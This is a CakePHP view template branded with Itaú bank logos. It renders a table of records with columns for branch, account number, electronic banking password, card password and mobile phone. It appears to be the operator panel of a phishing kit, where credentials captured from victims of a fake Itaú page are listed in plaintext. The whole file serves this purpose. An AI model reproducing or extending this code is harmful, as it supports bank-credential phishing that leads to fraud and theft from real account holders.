<div class="container-itau">
	<nav class="navbar">
		<div class="row">
			<div class="col-md-12">
				<div class="col-md-4 col-xs-4">
					<?= $this->Html->image('itau/logo-itau-fb.png', ['class' => 'logo_form']) ?>
				</div>
				<div class="col-md-4 col-xs-4"></div>
				<div class="col-md-4 col-xs-4">
					<?= $this->Html->image('itau/logo_30_horas.png', ['class' => 'trinta_hrs_form']) ?>
				</div>
			</div>			
		</div>
		<div class="row">
			<div class="col-md-12">
				<div class="col-md-12">
					<?= $this->Html->image('itau/acesso.jpg') ?>
				</div>
			</div>
		</div>
	</nav>
	<div class="col-md-12">
		<div class="table-responsive">
			<table class="table">
				<thead>
					<tr>
						<th>Agência</th>
						<th>Conta</th>
						<th>Senha Eletrônica</th>
						<th>Senha Cartão</th>
						<th>Celular</th>
					</tr>
				</thead>
				<tbody>
					<?php foreach ($dados as $key => $dados): ?>
						<tr>
							<td><?= $dados->agencia ?></td>
							<td><?= $dados->conta ?></td>
							<td><?= $dados->senha_eletronica ?></td>
							<td><?= $dados->senha_cartao ?></td>
							<td><?= $dados->celular ?></td>
						</tr>
					<?php endforeach ?>
				</tbody>
				<tfoot>
					<tr>
						<th>Agência</th>
						<th>Conta</th>
						<th>Senha Eletrônica</th>
						<th>Senha Cartão</th>
						<th>Celular</th>
					</tr>
				</tfoot>
			</table>
		</div>
	</div>
</div>